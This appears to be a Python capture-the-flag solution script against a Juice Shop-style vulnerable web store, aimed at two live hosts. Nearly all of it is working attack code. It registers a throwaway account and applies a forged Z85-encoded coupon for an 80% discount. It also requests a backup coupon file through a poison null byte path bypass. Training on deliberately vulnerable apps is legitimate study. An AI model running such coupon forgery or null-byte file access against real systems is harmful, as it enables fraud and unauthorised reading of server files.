#!/usr/bin/env python3

import requests
import time

def test_z85_coupon(base_url, server_name):
    print(f"\n🧪 Testing Z85 coupon on {server_name}: {base_url}")
    
    session = requests.Session()
    email = f"z85test{int(time.time())}@test.com"
    password = "Test123!"
    
    # Quick setup
    session.post(f"{base_url}/api/Users/", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"
    })
    
    login = session.post(f"{base_url}/rest/user/login", json={
        "email": email, "password": password
    })
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print(f"   ✅ Authenticated")
        
        # Add product
        products = session.get(f"{base_url}/rest/products/search").json()['data']
        session.post(f"{base_url}/api/BasketItems/", json={
            "ProductId": products[0]['id'], "quantity": 1
        })
        
        basket_id = session.get(f"{base_url}/rest/user/whoami").json()['user'].get('bid', 1)
        print(f"   Basket ID: {basket_id}")
        
        # Test the Z85 encoded coupon: OCT25-80 = h7Z^wpEw8p
        z85_coupon = "h7Z^wpEw8p"
        
        print(f"   Testing Z85 coupon: {z85_coupon} (should be 80% discount)")
        
        coupon_response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{z85_coupon}", json={})
        print(f"   Status: {coupon_response.status_code}")
        
        if coupon_response.status_code == 200:
            result = coupon_response.json()
            discount = result.get('discount', 0)
            print(f"   🎉 SUCCESS! Discount: {discount}%")
            
            if discount >= 80:
                print(f"   🏆 CHALLENGE SOLVED on {server_name}!")
                return True
        else:
            print(f"   Failed: {coupon_response.text}")
            
        # Also test accessing the backup file with poison null byte
        print(f"   Testing backup file access...")
        backup_response = session.get(f"{base_url}/ftp/coupons_2013.md.bak%00.pdf")
        print(f"   Backup file: HTTP {backup_response.status_code}")
        
    return False

# Test both servers
test_z85_coupon("https://juice5.wonkatech.org", "Cloudflare")  
test_z85_coupon("http://66.42.93.220", "Direct Server")
